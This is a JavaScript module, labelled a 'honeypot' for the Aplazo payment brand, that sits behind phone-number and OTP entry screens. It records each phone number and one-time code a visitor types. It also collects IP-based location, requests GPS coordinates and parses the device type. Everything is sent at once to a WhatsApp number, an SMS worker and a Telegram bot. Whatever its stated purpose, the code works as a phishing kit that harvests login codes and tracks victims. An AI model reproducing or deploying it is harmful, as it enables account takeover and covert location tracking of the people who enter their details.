// ════════════════════════════════════════════════════════════
//  APLAZO HONEYPOT — Sistema de Alerta y Captura
//  Captura datos del intruso y envía alertas por:
//    • WhatsApp (CallMeBot — gratis)
//    • SMS       (Twilio — trial gratis)
//    • Telegram  (si se configura)
// ════════════════════════════════════════════════════════════

// ─── Configuración (llenar en .env) ─────────────────────────
const CFG = {
  // WhatsApp CallMeBot
  WA_PHONE:   import.meta.env.VITE_WA_PHONE   || '',   // ej. +525512345678
  WA_APIKEY:  import.meta.env.VITE_WA_APIKEY  || '',   // clave de CallMeBot

  // SMS — Twilio (vía Worker de Cloudflare para no exponer credenciales)
  SMS_WORKER: import.meta.env.VITE_SMS_WORKER || '',   // URL del Worker

  // Telegram (opcional)
  TG_TOKEN:   import.meta.env.VITE_TG_TOKEN   || '',
  TG_CHAT:    import.meta.env.VITE_TG_CHAT    || '',
}

// ─── Estado de sesión del intruso ───────────────────────────
let session = {
  telefono: '',
  otp:      '',
  ip:       '',
  ciudad:   '',
  pais:     '',
  lat:      null,
  lon:      null,
  ua:       navigator.userAgent,
  hora:     '',
  enviado:  false,
}

// ─── Detectar IP y ubicación aproximada (sin pedir permiso) ──
async function detectarIP() {
  try {
    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' })
    const d = await r.json()
    session.ip     = d.ip      || '?'
    session.ciudad = d.city    || '?'
    session.pais   = d.country_name || '?'
    if (!session.lat) session.lat = d.latitude
    if (!session.lon) session.lon = d.longitude
  } catch {
    try {
      const r2 = await fetch('https://api.ipify.org?format=json')
      const d2 = await r2.json()
      session.ip = d2.ip || '?'
    } catch { session.ip = 'desconocida' }
  }
}

// ─── Pedir geolocalización GPS al navegador ──────────────────
function pedirGPS() {
  if (!navigator.geolocation) return
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      session.lat = pos.coords.latitude
      session.lon = pos.coords.longitude
    },
    () => { /* silencioso si el usuario niega */ },
    { timeout: 8000, maximumAge: 0 }
  )
}

// ─── Parsear dispositivo desde User-Agent ───────────────────
function parsearDispositivo() {
  const ua = session.ua
  let dispositivo = 'Desconocido'
  let navegador   = 'Desconocido'

  if (/iPhone/.test(ua))       dispositivo = 'iPhone'
  else if (/iPad/.test(ua))    dispositivo = 'iPad'
  else if (/Android/.test(ua)) dispositivo = 'Android'
  else if (/Windows/.test(ua)) dispositivo = 'Windows PC'
  else if (/Mac/.test(ua))     dispositivo = 'Mac'

  if (/Chrome\//.test(ua) && !/Edge\//.test(ua))  navegador = 'Chrome'
  else if (/Firefox\//.test(ua))                   navegador = 'Firefox'
  else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) navegador = 'Safari'
  else if (/Edge\//.test(ua))                      navegador = 'Edge'

  return `${dispositivo} / ${navegador}`
}

// ─── Construir mensaje de alerta ────────────────────────────
function construirMensaje() {
  const mapLink = (session.lat && session.lon)
    ? `https://maps.google.com/?q=${session.lat},${session.lon}`
    : null

  return [
    '🚨 HONEYPOT ACTIVADO — APLAZO',
    '━━━━━━━━━━━━━━━━━━━━━━',
    `📱 Teléfono: ${session.telefono || '(no ingresado)'}`,
    `🔢 OTP intento: ${session.otp || '(aún no)'}`,
    '━━━━━━━━━━━━━━━━━━━━━━',
    `🌐 IP: ${session.ip}`,
    `🏙️ Ubicación: ${session.ciudad}, ${session.pais}`,
    mapLink ? `📍 GPS: ${mapLink}` : '📍 GPS: no disponible',
    `🖥️ Dispositivo: ${parsearDispositivo()}`,
    `⏰ ${session.hora}`,
  ].join('\n')
}

// ─── Enviar por WhatsApp (CallMeBot) ─────────────────────────
async function enviarWhatsApp(mensaje) {
  if (!CFG.WA_PHONE || !CFG.WA_APIKEY) return
  try {
    const url = `https://api.callmebot.com/whatsapp.php?phone=${CFG.WA_PHONE}&text=${encodeURIComponent(mensaje)}&apikey=${CFG.WA_APIKEY}`
    await fetch(url, { mode: 'no-cors' })
  } catch { /* silencioso */ }
}

// ─── Enviar por SMS (vía Cloudflare Worker) ──────────────────
async function enviarSMS(mensaje) {
  if (!CFG.SMS_WORKER) return
  try {
    await fetch(CFG.SMS_WORKER, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mensaje, sesion: session }),
    })
  } catch { /* silencioso */ }
}

// ─── Enviar por Telegram ─────────────────────────────────────
async function enviarTelegram(mensaje) {
  if (!CFG.TG_TOKEN || !CFG.TG_CHAT) return
  try {
    await fetch(`https://api.telegram.org/bot${CFG.TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CFG.TG_CHAT, text: mensaje }),
    })
  } catch { /* silencioso */ }
}

// ─── Disparar alerta completa ────────────────────────────────
async function dispararAlerta() {
  if (session.enviado) return   // solo una alerta por sesión
  session.enviado = true
  session.hora = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })

  await detectarIP()            // asegura que tenemos IP antes de enviar

  const msg = construirMensaje()
  await Promise.allSettled([
    enviarWhatsApp(msg),
    enviarSMS(msg),
    enviarTelegram(msg),
  ])
}

// ════════════════════════════════════════════════════════════
//  API pública — llamada desde los screens
// ════════════════════════════════════════════════════════════

/** Llamar al cargar la app — inicia detección silenciosa */
export function iniciarHoneypot() {
  detectarIP()
  pedirGPS()
}

/** Llamar cuando el intruso ingresa su teléfono */
export function capturarTelefono(numero) {
  session.telefono = numero
  session.enviado  = false   // permite nueva alerta si cambia de número
  // Primera alerta parcial (sin OTP) — sabemos que alguien ingresó
  dispararAlerta()
}

/** Llamar cuando el intruso intenta un código OTP */
export function capturarOTP(codigo) {
  session.otp     = codigo
  session.enviado = false    // forzar segunda alerta con el OTP
  dispararAlerta()
}
